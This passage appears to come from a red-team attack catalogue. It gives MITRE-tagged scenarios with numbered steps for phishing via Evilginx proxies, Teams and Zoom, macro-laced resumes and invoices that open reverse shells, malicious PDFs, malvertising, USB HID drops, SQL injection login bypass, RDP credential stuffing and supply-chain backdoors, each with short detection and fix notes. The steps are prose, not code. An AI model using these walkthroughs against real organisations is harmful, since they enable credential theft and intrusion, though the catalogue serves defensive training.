- **Tools**: DNSPoison, Custom Backdoor, CertUtil
- **Scenario**: A vendor’s software update server is compromised, allowing attackers to insert a signed update containing a hidden backdoor that grants remote access after installation.
- **Attack Steps**: 1. The attacker breaches the CI/CD infrastructure of the software vendor or poisons DNS to redirect the update URL.2. They replace the legitimate update binary with a trojanized version that includes a stealthy remote access payload.3. The attacker resigns the binary using either stolen certificates or valid signing keys from the compromised vendor.4. Unsuspecting users within enterprises automatically fetch and install the update due to built-in update checks.5. The backdoor opens a reverse shell to the attacker’s server, often hidden behind encrypted traffic or legitimate cloud services.6. The attacker can now execute commands, move laterally, or deploy further payloads across the environment.7. Persistence is achieved via services or DLL injection in critical system processes.
- **Detection**: EDR logs, traffic to rare IPs, software hash mismatch
- **Solution**: Use signed updates, verify hashes, implement update source pinning
- **Tags**: RedTeam, InitialAccess, SupplyChain, Backdoor, SignedMalware, MITRE_T1195_002

## Vendor Mailbox Compromise for Internal Attack

- **Attack Type**: BEC + Partner Compromise
- **Target**: Human (Employee)
- **Vulnerability**: Overtrust in vendor, weak partner email security
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Initial access, internal compromise
- **Tools**: O365, Evilginx, DKIM Bypass
- **Scenario**: A compromised vendor account is used to impersonate a real business partner, tricking employees into opening malicious attachments or links.
- **Attack Steps**: 1. Attacker targets a small business vendor with weak email security and uses phishing to compromise their mailbox.2. Once access is gained, the attacker reads previous correspondence and creates a realistic continuation of a business discussion.3. A malware-laden invoice or link is embedded in the reply, resembling ongoing transactional emails.4. An internal employee, recognizing the vendor, opens the attachment or clicks the link, triggering malware execution.5. The malware opens a reverse shell or steals session cookies.6. Attacker pivots to internal systems and begins lateral movement.7. Persistence is maintained using Office 365 add-ins or OAuth token abuse.
- **Detection**: Mailbox rule anomalies, vendor traffic changes
- **Solution**: Perform vendor audits, enforce MFA for partners
- **Tags**: RedTeam, InitialAccess, BEC, PartnerAttack, MITRE_T1078

## Resume-Based Spearphishing with Macro Shell

- **Attack Type**: Spearphishing Resume Payload
- **Target**: Human (HR Staff)
- **Vulnerability**: Macro execution allowed, Office trust settings
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Initial foothold, remote shell
- **Tools**: MS Word, PowerShell, Nishang
- **Scenario**: An HR staff receives a resume.doc file with malicious macros that open a reverse PowerShell session upon enabling macros.
- **Attack Steps**: 1. Attacker crafts a CV document using a job application template and embeds obfuscated VBA macros.2. Macros are configured to execute a payload using PowerShell that connects to the attacker's server.3. Email is written with job-related content, tailored to the target company and sent to HR addresses.4. Once the macro is enabled, it launches PowerShell and downloads a stager from a remote server.5. The stager opens a reverse shell, giving attacker remote access.6. Attacker probes for admin rights and attempts privilege escalation via misconfigurations or known exploits.7. Persistence is set using startup folders or scheduled tasks.
- **Detection**: Macro execution logs, new process spawn from Office
- **Solution**: Disable macros, use sandbox analysis for HR resumes
- **Tags**: RedTeam, InitialAccess, Spearphishing, ResumePayload, PowerShell, MITRE_T1566_001

## Internal Chat Phishing via Teams

- **Attack Type**: Collaboration Tool Exploitation
- **Target**: Human (Employee)
- **Vulnerability**: Blind trust in internal tools, lack of session validation
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Credential theft, session hijacking
- **Tools**: Evilginx, Teams API, Phishing Kit
- **Scenario**: The attacker uses a compromised Microsoft 365 account to send a phishing message via Teams, imitating the internal IT team to steal credentials.
- **Attack Steps**: 1. Attacker compromises a legitimate employee’s Microsoft 365 credentials via phishing.2. Using the compromised account, the attacker spoofs the IT support team profile on Teams.3. Sends a fake “mandatory login verification” message to coworkers through chat.4. The message contains a link to a fake login page hosted on an attacker-controlled domain.5. When the target enters credentials, Evilginx captures the session token and bypasses MFA.6. Attacker logs in immediately, often from a cloud VPS with similar GeoIP as the target.7. Moves laterally or sets persistence using MFA session hijacking.
- **Detection**: Token anomalies, new devices, Teams audit logs
- **Solution**: Monitor Teams messages, enforce reauthentication
- **Tags**: RedTeam, InitialAccess, MS_Teams, Phishing, MITRE_T1566_002

## Email Phishing – Spoofed Domain with Reverse Proxy

- **Attack Type**: Credential Harvesting via Email
- **Target**: Human (Email User)
- **Vulnerability**: DNS name similarity, reverse proxy blindness
- **MITRE**: T1566.002 – Phishing: Link
- **Impact**: Credential theft + session hijacking
- **Tools**: Evilginx2, Gandi.net, ProtonMail
- **Scenario**: The attacker registers a lookalike domain and sets up a reverse proxy to a real login page. Victims enter credentials, unaware of the proxy capturing data.
- **Attack Steps**: 1. Register a lookalike domain (e.g., g00gle-support[.]com).2. Set up hosting with DNS pointing to a VPS.3. Install Evilginx2 on the server and configure a phishing campaign.4. Add a phishing configuration for the target site (e.g., Outlook or Google).5. Evilginx2 acts as a reverse proxy, relaying the real login page while stealing credentials and session cookies.6. Configure SSL certificates via Let's Encrypt.7. Compose a phishing email and send it to the target.8. When the victim logs in, the proxy captures the credentials and session cookies.
- **Detection**: Email filtering, anomaly login patterns
- **Solution**: Domain monitoring, user training, URL verification, MFA
- **Tags**: #RedTeam #InitialAccess #CredentialHarvesting #Evilginx2 #MITRE_T1566_002 #Phishing

## Voice Phishing – Fake Compliance Audit

- **Attack Type**: Voice Phishing (Vishing)
- **Target**: Human (Employee)
- **Vulnerability**: Blind trust in internal-sounding calls
- **MITRE**: T1598.004 – Phishing: Voice
- **Impact**: Account compromise, lateral access
- **Tools**: VoIP, Spoofed Caller ID
- **Scenario**: The attacker calls claiming to be from the internal compliance team, citing policy violations and needing credential verification.
- **Attack Steps**: 1. Research the target via LinkedIn or internal data.2. Set up a spoofed caller ID to match company patterns.3. Call the target pretending to be a compliance officer.4. Claim a violation linked to their login account.5. Pressure the user to verify credentials or risk temporary deactivation.6. Capture credentials verbally or redirect via phishing link.7. Log in using stolen credentials to gain access or move laterally.
- **Detection**: Call record monitoring, anomaly detection
- **Solution**: Caller ID validation, user training, second-channel identity verification
- **Tags**: #RedTeam #InitialAccess #Vishing #SocialEngineering #MITRE_T1598_004

## Email – Malicious PDF with Auto-Execution

- **Attack Type**: PDF Exploit via JavaScript
- **Target**: Human (Email User)
- **Vulnerability**: Weak attachment scanning, JS in PDFs
- **MITRE**: T1566.001
- **Impact**: Remote code execution, system compromise
- **Tools**: PDF Stream Dumper, MSFVenom
- **Scenario**: A PDF file embedded with malicious JavaScript silently executes a reverse shell when opened in an unpatched Adobe Reader.
- **Attack Steps**: 1. Generate a reverse shell payload using MSFVenom.2. Inject JavaScript into a PDF using PDF Stream Dumper.3. Hide JS with obfuscation and remove metadata to reduce detection.4. Host secondary payload on a remote server.5. Email the malicious PDF to the target, spoofing a finance-related sender.6. When the user opens the PDF, the JS triggers a connection to download and execute the shell.7. Attacker gets access and escalates privileges.
- **Detection**: AV alert, attachment sandbox behavior
- **Solution**: Block JS in PDFs, user education, disable auto-open
- **Tags**: #RedTeam #EmailPhishing #PDFExploit #MITRE_T1566_001

## Drive-by Download via Malvertising Campaign

- **Attack Type**: Drive-by Download
- **Target**: Human (Web User)
- **Vulnerability**: Outdated browsers, no script control
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Remote access trojan (RAT), surveillance
- **Tools**: Exploit Kit, Malvertising platform
- **Scenario**: The attacker uses malicious online ads that redirect unsuspecting users to exploit kits which silently download malware.
- **Attack Steps**: 1. Build an exploit kit hosting page to deliver a RAT.2. Purchase ads via low-cost or shady ad networks.3. Embed redirect JavaScript within the ad creative.4. Deploy the ads targeting demographics relevant to the victim org.5. Victim visits a legitimate site showing the ad.6. JS redirects browser to exploit kit page that installs the payload.7. RAT establishes C2 channel.
- **Detection**: Browser telemetry, DNS logs, EDR popups
- **Solution**: Ad blockers, JS restrictions, browser patching
- **Tags**: #RedTeam #InitialAccess #Malvertising #DriveBy #RAT #MITRE_T1189

## USB Drop – HID Attack with WiFi Callback

- **Attack Type**: Physical HID Injection
- **Target**: Human (On-site Staff)
- **Vulnerability**: No USB policies, human curiosity
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Persistent foothold, covert network access
- **Tools**: Rubber Ducky, ESP32-C2, Responder
- **Scenario**: Attacker plants USBs containing a Rubber Ducky payload that runs PowerShell commands and installs a WiFi beacon to call home.
- **Attack Steps**: 1. Create a Ducky script that opens PowerShell and disables Defender.2. Script downloads a WiFi beacon agent that uses ESP32-C2 to ping attacker.3. Configure persistent callback and data exfil pipeline.4. Drop the USBs in employee parking lot, waiting for someone to plug in.5. When plugged in, script runs, installs beacon, and attacker starts receiving data.
- **Detection**: USB device logs, wireless scanning
- **Solution**: Disable USB ports, user awareness, endpoint lockdown
- **Tags**: #RedTeam #USBDrop #WiFiBeacon #RubberDucky #MITRE_T1200

## Exploit Web App – SQLi Login Bypass

- **Attack Type**: Web Exploitation
- **Target**: Web App (Server)
- **Vulnerability**: Lack of input validation, no WAF
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Full control over web interface
- **Tools**: SQLMap, Burp Suite, Nikto
- **Scenario**: Attacker finds a login form vulnerable to SQL injection and bypasses authentication to gain access to the web admin panel.
- **Attack Steps**: 1. Use Nikto to identify login forms and Burp to intercept POST data.2. Fuzz for SQL injection using ' OR 1=1 -- or similar.3. Automate exploitation using SQLMap.4. On success, gain access to restricted admin interface.5. Upload a web shell or extract internal data.6. Use the foothold for privilege escalation or lateral movement.
- **Detection**: WAF logs, suspicious DB queries
- **Solution**: Input sanitization, WAF, patching
- **Tags**: #RedTeam #InitialAccess #SQLi #MITRE_T1190

## Office Macro – Downloader with PowerShell

- **Attack Type**: Malicious Office Macro
- **Target**: Human (Employee)
- **Vulnerability**: Enabled macros, spoofed trust source
- **MITRE**: T1566.001, T1203
- **Impact**: Remote access, credential theft
- **Tools**: MSFVenom, Excel, PowerShell Empire
- **Scenario**: An Excel file contains a macro that, once enabled, executes a PowerShell script to download and install a remote access trojan.
- **Attack Steps**: 1. Embed PowerShell-based downloader inside a macro in a .xlsm file.2. Configure payload to fetch a binary from the attacker's server.3. Name file as “Urgent_Invoice_Q2.xlsm”.4. Email the file as an urgent invoice from a spoofed vendor.5. Victim opens file and enables macro.6. PowerShell command executes and downloads a RAT.7. RAT connects to the C2 and gives the attacker access.
- **Detection**: AV logs, macro execution monitoring
- **Solution**: Disable macros, sandbox analysis, user awareness training
- **Tags**: #RedTeam #MacroMalware #ExcelExploit #MITRE_T1203 #MITRE_T1566_001

## Lookalike Domain + Transparent Reverse Proxy

- **Attack Type**: Credential Harvesting via Email
- **Target**: Human (Email User)
- **Vulnerability**: Domain spoofing, session token theft
- **MITRE**: T1566.002
- **Impact**: Stealth credential theft with session reuse
- **Tools**: Evilginx2, Namecheap, SSLForFree
- **Scenario**: Attacker mimics a well-known domain and uses a transparent reverse proxy to capture credentials and tokens as users unknowingly authenticate via real pages.
- **Attack Steps**: 1. Purchase a domain closely resembling the target (e.g., paypaI-secure[.]com).2. Configure domain and DNS records to point to a VPS running NGINX.3. Set up Evilginx2 with appropriate phishing templates (e.g., for Microsoft365).4. Configure Let's Encrypt SSL certs for legitimacy.5. Customize HTTP headers and landing pages to evade detection tools.6. Craft a convincing spear-phishing email tailored to the recipient's org context.7. Launch the campaign and send emails.8. Victim clicks link, authenticates on real-looking site proxied via Evilginx2.9. Credentials and session tokens are silently captured.10. Attacker immediately replays token for account takeover or lateral movement.
- **Detection**: OAuth logs, proxy anomalies
- **Solution**: Domain watchlists, user training, token binding
- **Tags**: #RedTeam #Phishing #Evilginx2 #SessionHijack #MITRE_T1566_002

## Compliance-themed Voice Phishing Campaign

- **Attack Type**: Voice Phishing (Vishing)
- **Target**: Human (Employee)
- **Vulnerability**: Voice-based trust exploitation
- **MITRE**: T1598.004
- **Impact**: Early-stage access for lateral movement
- **Tools**: SpoofCard, VoIP.ms, OSINT tools
- **Scenario**: The attacker impersonates internal audit teams, using urgency and authority to trick targets into revealing credentials over the phone or clicking a link.
- **Attack Steps**: 1. Harvest employee names and titles from LinkedIn, company site, or breaches.2. Create a spoofed VoIP profile to match internal caller ID formats.3. Write a scripted conversation that mimics real internal compliance workflows.4. Initiate calls during business hours, targeting lower-tier employees first.5. Claim there's a policy violation in their account access patterns.6. Use social pressure to validate their login identity “immediately”.7. Collect credentials verbally or send a phishing link during the call.8. Record response time, behavioral cues.9. Use harvested credentials for internal pivot or data extraction.10. Exploit trust culture before detection mechanisms are triggered.
- **Detection**: Call timing correlation, behavioral analysis
- **Solution**: VoIP restrictions, escalation verification
- **Tags**: #RedTeam #VoicePhishing #AuditImpersonation #SocialEngineering #MITRE_T1598_004

## PDF-Based JS Loader with Auto Callback

- **Attack Type**: PDF Exploit via JavaScript
- **Target**: Human (Email User)
- **Vulnerability**: JS parsing in PDF viewers, user trust
- **MITRE**: T1566.001
- **Impact**: Initial access with stealth execution
- **Tools**: Metasploit, PDF Xplorer, ObfuscationJS
- **Scenario**: A maliciously crafted PDF with embedded JavaScript triggers a reverse shell backdoor when opened in an unpatched reader.
- **Attack Steps**: 1. Generate an obfuscated reverse TCP shell using MSFVenom.2. Embed the payload into a legitimate-looking PDF using PDF Xplorer.3. Obfuscate JavaScript and remove embedded metadata.4. Rename the PDF as something urgent (e.g., “Tax_Notice_2025.pdf”).5. Host the secondary payload on a hardened remote server.6. Compose phishing email appearing to be from finance or HR.7. Attach PDF and send to multiple employees within target org.8. Upon opening the file, JavaScript silently executes.9. Payload connects to the C2 server initiating a shell.10. Attacker maintains access for further exploitation.
- **Detection**: PDF behavior sandbox, heuristic rules
- **Solution**: JS execution hardening, macro/content warnings
- **Tags**: #RedTeam #PDFMalware #JavaScriptExfiltration #MITRE_T1566_001

## Ad Network Abuse for Malware Delivery

- **Attack Type**: Drive-by Download
- **Target**: Human (Browser User)
- **Vulnerability**: Ads bypassing content control
- **MITRE**: T1189
- **Impact**: Stealth infection and remote foothold
- **Tools**: RIG Exploit Kit, OpenX, JavaScript
- **Scenario**: The attacker leverages malvertising to redirect users to exploit kits that target vulnerable browsers for silent malware drop.
- **Attack Steps**: 1. Rent traffic from underground ad networks serving unvetted banners.2. Create a malicious ad using obfuscated JavaScript with redirect logic.3. Register a legitimate-sounding advertiser account on a low-tier platform.4. Host exploit kit landing page exploiting browser or Flash vulnerabilities.5. Inject tracking pixels to measure click-through success.6. Target specific user geos or ad categories matching victim profile.7. Ads run on legitimate sites — victim sees ad and JS triggers redirect.8. Landing page exploits outdated plugins to drop payload.9. RAT or infostealer activates and initiates C2.10. Monitor C2 logs for successful infection for further exploitation.
- **Detection**: Ad telemetry, DNS filtering, behavioral logs
- **Solution**: JS lockdown, ad script filtering, exploit detection
- **Tags**: #RedTeam #Malvertising #ExploitKit #MITRE_T1189

## USB Payload – WiFi Exfiltration Module

- **Attack Type**: Physical HID Injection
- **Target**: Human (On-site Staff)
- **Vulnerability**: Physical access + OS trust in input devices
- **MITRE**: T1200
- **Impact**: Network exfil and remote access
- **Tools**: Rubber Ducky, ESP32, PowerShell Empire
- **Scenario**: A planted USB device simulates keystrokes, disables protection, installs a backdoor beacon, and exfiltrates over WiFi.
- **Attack Steps**: 1. Write a payload in Ducky Script that opens CMD silently.2. Script disables Defender, checks for admin privileges, and launches PowerShell.3. PowerShell script downloads a WiFi beacon that communicates via ESP32.4. Configure ESP32 to connect to a hidden SSID or attacker AP.5. Flash beacon agent with persistence on the victim machine.6. Deploy physical USBs in public or employee zones (cafeteria, parking).7. User plugs in USB out of curiosity.8. Payload executes immediately simulating human input.9. WiFi beacon establishes covert exfil path.10. Attacker collects access info or triggers further payload remotely.
- **Detection**: USB logs, wireless signal anomalies
- **Solution**: Endpoint hardening, USB policy, beacon signal blocking
- **Tags**: #RedTeam #PhysicalAttack #WiFiExfiltration #MITRE_T1200

## Admin Panel Takeover via SQL Injection

- **Attack Type**: Web Exploitation
- **Target**: Web App (Server)
- **Vulnerability**: Poor validation, no WAF, verbose SQL errors
- **MITRE**: T1190
- **Impact**: Backend compromise and lateral movement
- **Tools**: SQLMap, Burp Suite, OWASP ZAP
- **Scenario**: Exploiting an unsanitized login form with SQL payloads to bypass authentication, gaining direct admin control.
- **Attack Steps**: 1. Scan for input forms using automated tools (e.g., Nikto, ZAP).2. Intercept login request with Burp Suite and test payloads like ' OR '1'='1. 3. Use SQLMap to automate the injection and test DBMS fingerprinting.4. Extract DB schema if possible and identify user tables.5. Bypass login by injecting always-true condition into the username/password fields.6. Access admin panel.7. Install web shell, enumerate server config.8. Steal sensitive records or upload tools for lateral movement.9. Hide traces and log off.10. Maintain access through hidden backdoor if persistence is desired.
- **Detection**: Suspicious query patterns, WAF signatures
- **Solution**: Input validation, WAF, parameterized queries
- **Tags**: #RedTeam #SQLi #LoginBypass #WebShell #MITRE_T1190

## Invoice Macro Attack with PowerShell Chain

- **Attack Type**: Malicious Office Macro
- **Target**: Human (Employee)
- **Vulnerability**: Macros enabled, lack of C2 detection
- **MITRE**: T1566.001, T1203
- **Impact**: Remote control and data theft
- **Tools**: PowerShell Empire, Excel, C2 Server
- **Scenario**: A malicious Excel file embedded with macro downloads a RAT through PowerShell once the user enables content.
- **Attack Steps**: 1. Create a PowerShell payload that downloads and runs a RAT.2. Use Excel VBA macro to call PowerShell silently.3. Hide VBA code behind Excel events (Workbook_Open).4. Obfuscate macro code using string encoding.5. Save file with business-related name like “Invoice_July_2025.xlsm”.6. Spoof sender email using a trusted vendor domain.7. Send file with urgent subject line requesting immediate action.8. When opened and macro is enabled, PowerShell connects to C2 and installs RAT.9. Attacker gets shell access.10. Logs and keystrokes are captured and exfiltrated silently.
- **Detection**: Macro event logging, PowerShell telemetry
- **Solution**: Disable macros, restrict PowerShell, behavioral analytics
- **Tags**: #RedTeam #OfficeMacro #PowerShellAttack #MITRE_T1203 #MITRE_T1566_001

## RDP Credential Stuffing & Persistence

- **Attack Type**: Credential Brute Force
- **Target**: Windows Servers with RDP
- **Vulnerability**: Use of weak/stolen credentials; exposed RDP port
- **MITRE**: T1110.001 – Brute Force: Password Guessing
- **Impact**: Unauthorized access, persistent control
- **Tools**: Nmap, CrackMapExec, Impacket
- **Scenario**: Adversary identifies exposed RDP services and attempts credential stuffing using stolen combos.
- **Attack Steps**: 1. Use Nmap to scan a target IP range for open port 3389 indicating RDP exposure. 2. Identify target systems with accessible RDP endpoints. 3. Gather known leaked credential combinations (username/passwords) from breached databases or previous campaigns. 4. Utilize CrackMapExec or similar tools to automate credential stuffing attempts against multiple systems. 5. On successful login, establish persistent RDP access by adding a new user or creating scheduled tasks. 6. Conduct post-exploitation enumeration and privilege escalation. 7. Create firewall or AV exclusions to maintain stealth.
- **Detection**: RDP login failure logs, brute force patterns
- **Solution**: Enforce complex passwords, monitor RDP use, Geo-restrict RDP access
- **Tags**: RedTeam, RDP, CredentialStuffing, BruteForce, MITRE_T1110_001

## Torrent-Based RAT Delivery Campaign

- **Attack Type**: Trojanized Software Download
- **Target**: Torrent Downloading Users
- **Vulnerability**: Trust in cracked software; lack of endpoint controls
- **MITRE**: T1204.002 – User Execution: Malicious File
- **Impact**: Remote control, keylogging, surveillance
- **Tools**: SpyNote, BitTorrent, Advanced Installer
- **Scenario**: Attacker embeds a remote access trojan (RAT) within a cracked installer and seeds it on torrents.
- **Attack Steps**: 1. Package a legitimate cracked software setup (e.g., Photoshop crack) and embed a SpyNote-based RAT using an installer tool like Advanced Installer. 2. Configure spyware to operate silently post-installation (e.g., keylogger, webcam access). 3. Upload to popular torrent trackers with attractive descriptions and verified-looking uploader profiles. 4. Ensure high seeding rates to boost download visibility. 5. Victim downloads and installs software, unknowingly executing the embedded RAT. 6. Attacker gains persistent access to the victim's system.
- **Detection**: Unusual DNS requests, unknown processes
- **Solution**: Block torrent domains, implement software policy, educate users
- **Tags**: RedTeam, RAT, TorrentMalware, Spyware, TrojanizedApp, MITRE_T1204_002

## Drive-By Exploit via Infected Advertisement

- **Attack Type**: Malvertising with Exploit Kits
- **Target**: Web Users
- **Vulnerability**: Ad delivery abuse, outdated browser/plugins
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Initial access, stealth C2 connection
- **Tools**: RIG EK, Cobalt Strike, Malvertising Net
- **Scenario**: A malicious advertisement redirects the user to a landing page hosting an exploit kit.
- **Attack Steps**: 1. Adversary registers an ad with a low-cost ad distribution network and creates a fake business campaign. 2. The ad contains an iframe or redirect to an attacker-controlled exploit kit landing page. 3. When a user visits a site serving the ad, the redirect silently loads and fingerprinting begins. 4. If the user's browser is unpatched, the exploit kit triggers vulnerabilities (e.g., Flash, JavaScript). 5. Cobalt Strike Beacon is delivered as the payload. 6. The system is compromised and the beacon is used for remote command and control.
- **Detection**: HTTP traffic anomalies, process behavior
- **Solution**: Patch browsers/plugins, use ad blockers, enable EDR
- **Tags**: RedTeam, DriveBy, Malvertising, ExploitKit, CobaltStrike, MITRE_T1189

## Software Supply Chain Tampering via CI/CD

- **Attack Type**: Third-Party Update Compromise
- **Target**: Corporate Users of Vendor Apps
- **Vulnerability**: Lack of validation in update chain
- **MITRE**: T1195.002 – Supply Chain Compromise
- **Impact**: Full environment compromise
- **Tools**: Git, Jenkins, Burp Suite, Custom Loader
- **Scenario**: Attacker gains access to CI/CD pipeline of a vendor and modifies software builds.
- **Attack Steps**: 1. Discover a misconfigured or vulnerable CI/CD pipeline belonging to a widely-used vendor. 2. Gain access using leaked credentials or exploit Jenkins/GitHub vulnerabilities. 3. Modify build scripts or include a malicious backdoor payload during the build phase. 4. Wait for the vendor’s next update release cycle. 5. When customers update the software, the backdoor executes in their environments. 6. Attacker connects to victim systems using hardcoded C2 channels in the malware.
- **Detection**: Monitor software hashes, endpoint telemetry
- **Solution**: Enforce signed builds, validate vendor updates, restrict dev pipeline access
- **Tags**: RedTeam, SupplyChainAttack, SoftwareBackdoor, CI/CDCompromise, MITRE_T1195_002

## Partner-to-Employee Phishing with Invoice Trap

- **Attack Type**: Business Email Compromise (BEC)
- **Target**: Internal Finance Staff
- **Vulnerability**: Trust in partner communications
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Lateral access, malware infection
- **Tools**: Evilginx, GoPhish, O365
- **Scenario**: An attacker abuses a compromised partner email account to deliver malware-laced invoices.
- **Attack Steps**: 1. Steal credentials to a trusted vendor's email account via phishing or credential leaks. 2. Monitor ongoing communications to identify a business transaction in progress. 3. Craft a malicious invoice resembling the vendor's usual format and embed a macro payload or a malware downloader. 4. Send email to finance or procurement staff from the compromised partner account. 5. On execution, the payload connects to a remote server, providing the attacker internal access.
- **Detection**: Email header anomalies, macro execution logs
- **Solution**: Enable MFA for all partners, use domain spoof protection, validate invoices
- **Tags**: RedTeam, BEC, PartnerAbuse, InvoiceTrap, MITRE_T1078

## HR Resume Campaign with Macro + DGA C2

- **Attack Type**: Weaponized Resume Phishing
- **Target**: HR or Recruitment Mailboxes
- **Vulnerability**: Macro-enabled Office, lack of AV on resumes
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Covert C2, internal recon
- **Tools**: MS Word, PowerShell, Empire, DGA
- **Scenario**: Malicious resume document with macro connects to a DGA-based C2 infrastructure.
- **Attack Steps**: 1. Craft a .doc resume using MS Word with embedded VBA macro. 2. Macro, when triggered, decodes and runs PowerShell to download Empire stager from a DGA-based domain (Domain Generation Algorithm). 3. Send to HR/recruiters under the pretense of a job application. 4. Upon macro enablement, reverse shell connects to the attacker. 5. Lateral movement begins from HR system to other internal assets.
- **Detection**: DNS behavior analysis, macro usage monitoring
- **Solution**: Disable macros, inspect resume origin, sandbox unknown docs
- **Tags**: RedTeam, ResumePhish, MacroC2, DGA, SpearPhishing, MITRE_T1566_001

## Teams-Based Phishing with SSO Hijack

- **Attack Type**: Phishing via Collaboration Tool
- **Target**: Internal Corporate Users
- **Vulnerability**: Blind trust in Teams messages; lack of MFA alerts
- **MITRE**: T1566.002 – Phishing via Service
- **Impact**: Credential/session theft, lateral access
- **Tools**: Evilginx, MS Teams, AzureAD
- **Scenario**: Attacker sends fake IT support messages via Microsoft Teams to steal SSO credentials.
- **Attack Steps**: 1. Create an external account with a similar username/avatar to internal IT support. 2. Send unsolicited chat messages via Teams requesting urgent password reset or account verification. 3. Share a link to a fake Azure SSO portal hosted using Evilginx. 4. When user logs in, Evilginx captures the session token. 5. Use stolen token to access internal tools via SSO without triggering login alerts. 6. Move laterally through O365 apps and file shares.
- **Detection**: Conditional access anomalies, login token reuse
- **Solution**: Educate users, restrict external chats, monitor token misuse
- **Tags**: RedTeam, TeamsPhish, SSOTheft, Evilginx, CollaborationAbuse, MITRE_T1566_002

## Weaponized Resume Submission to HR

- **Attack Type**: Document-Based Social Engineering
- **Target**: HR Team
- **Vulnerability**: Use of macro-enabled Office files and HR trust
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Remote access, internal recon, possible lateral movement
- **Tools**: MS Word, Macro, Empire
- **Scenario**: An attacker disguises as a potential job applicant and sends a weaponized résumé file to the HR department, exploiting trust in recruitment processes.
- **Attack Steps**: 1. Create a realistic and polished resume in .doc format using a common CV template. 2. Embed a macro-based payload (reverse shell or Empire stager) that triggers on document open. 3. Craft a professional-looking cover letter to appear credible. 4. Harvest legitimate job listings or HR emails via LinkedIn scraping. 5. Send the malicious resume as part of a job application from a spoofed or disposable email. 6. Upon macro execution by HR personnel, establish a reverse shell. 7. Maintain persistence and pivot further into internal systems.
- **Detection**: Email filters, Office macro execution behavior, network beacon alerts
- **Solution**: Disable macros by default, scan resume attachments, train HR on social engineering
- **Tags**: RedTeam, SpearPhishing, ResumeMalware, MacroAttack, HRPhish, MITRE_T1566_001

## Spoofed Zoom Invite for Executive Credential Theft

- **Attack Type**: Phishing via Collaboration Platforms
- **Target**: Executives
- **Vulnerability**: Implicit trust in internal meeting invites
- **MITRE**: T1566.002 – Spearphishing via Service
- **Impact**: Executive account takeover, internal access escalation
- **Tools**: SEToolkit, Ngrok, GoPhish
- **Scenario**: Attacker creates a fake Zoom invitation and sends it from a spoofed internal address, redirecting targets to a fake login page to harvest credentials.
- **Attack Steps**: 1. Clone the official Zoom login page using SEToolkit’s web cloning feature. 2. Deploy the page using Ngrok to expose it over the internet with HTTPS. 3. Craft a spoofed internal email using a known executive alias, invoking urgency (e.g., "Executive Briefing - Immediate Join Required"). 4. Send the phishing email to executive team members. 5. When the target clicks the invite, redirect them to the fake login and harvest credentials. 6. Leverage credentials to access corporate resources or conduct further internal spearphishing.
- **Detection**: Email domain analysis, anomalous login attempts
- **Solution**: Enforce MFA, verify meeting links, educate about phishing
- **Tags**: RedTeam, ZoomPhish, ExecutiveTarget, CredentialHarvest, MITRE_T1566_002

## Strategic Report PDF with Embedded Malware

- **Attack Type**: Espionage via Document Exploit
- **Target**: Defense Executives
- **Vulnerability**: Exploitable PDF reader vulnerabilities, spearphishing
- **MITRE**: T1566.001 – Spearphishing Attachment
- **Impact**: Sensitive data access, espionage risk
- **Tools**: Metasploit, PDF Exploit Kit
- **Scenario**: A fake strategy report in PDF format is sent to a defense contractor executive with embedded malware for remote code execution.
- **Attack Steps**: 1. Draft a well-crafted intelligence report styled in PDF format with defense-specific jargon. 2. Embed a malicious payload using PDF exploit techniques (e.g., buffer overflow or JavaScript exploit). 3. Pose as an analyst from a known think tank. 4. Email the file with a personalized message to C-suite at the defense firm. 5. Upon opening, the PDF silently executes code that creates a reverse connection to the attacker's listener. 6. Attacker maintains persistence and begins data exfiltration.
- **Detection**: Email scanning, behavioral analysis of PDF readers
- **Solution**: Use secure PDF viewers, sandboxing, restrict opening unsolicited files
- **Tags**: RedTeam, PDFExploit, DefenseSpearPhish, NationState, MITRE_T1566_001

## Google Drive Share Phishing

- **Attack Type**: Cloud Service Link Abuse
- **Target**: Cloud Users
- **Vulnerability**: Blind trust in cloud file shares
- **MITRE**: T1566.002 – Service Phishing
- **Impact**: Session hijacking, data exfiltration from cloud
- **Tools**: Evilginx, Ngrok, GDrive
- **Scenario**: A shared Google Drive link prompts login to a fake Google authentication page controlled by the attacker.
- **Attack Steps**: 1. Clone Google's login page and deploy with Evilginx for token interception. 2. Generate a shared Drive link pointing to an innocuous-looking document. 3. Send the email containing this link from a spoofed internal or vendor account. 4. When user clicks and attempts login, Evilginx captures credentials and session tokens. 5. Use tokens to bypass MFA and access GSuite resources.
- **Detection**: OAuth anomaly detection, custom domain filtering
- **Solution**: Block external Drive shares, train staff on cloud phish tactics
- **Tags**: RedTeam, GDrivePhish, CloudCredsTheft, Evilginx, MITRE_T1566_002

## Fake Helpdesk on Teams

- **Attack Type**: Internal Chat Exploit
- **Target**: Internal Staff
- **Vulnerability**: Implicit trust in internal Teams chats
- **MITRE**: T1566.002 – Collaboration App Phishing
- **Impact**: Privilege escalation, lateral movement
- **Tools**: Microsoft Teams, Evilginx
- **Scenario**: Attacker pretends to be IT support in Microsoft Teams and tricks the target into giving login credentials.
- **Attack Steps**: 1. Create an external account mimicking the internal helpdesk (e.g., it-support@teams365.live). 2. Join public Teams groups or send direct messages using social engineering. 3. Request urgent password resets or login validation. 4. Provide link to malicious login page via Evilginx. 5. Capture user credentials and tokens for internal access.
- **Detection**: Teams activity logging, suspicious message detection
- **Solution**: Restrict external messaging, educate on internal impersonation
- **Tags**: RedTeam, ChatPhishing, TeamsHack, MITRE_T1566_002

## Infosec Conference Invite with Malicious Flyer

- **Attack Type**: Event-Based Social Engineering
- **Target**: Researchers
- **Vulnerability**: Professional curiosity, unverified PDF opening
- **MITRE**: T1566.001 – Malicious PDF Attachment
- **Impact**: Malware installation, espionage
- **Tools**: Cobalt Strike, Adobe Exploit
- **Scenario**: A fake invite to a security conference is sent with an embedded malware flyer PDF, targeting researchers and analysts.
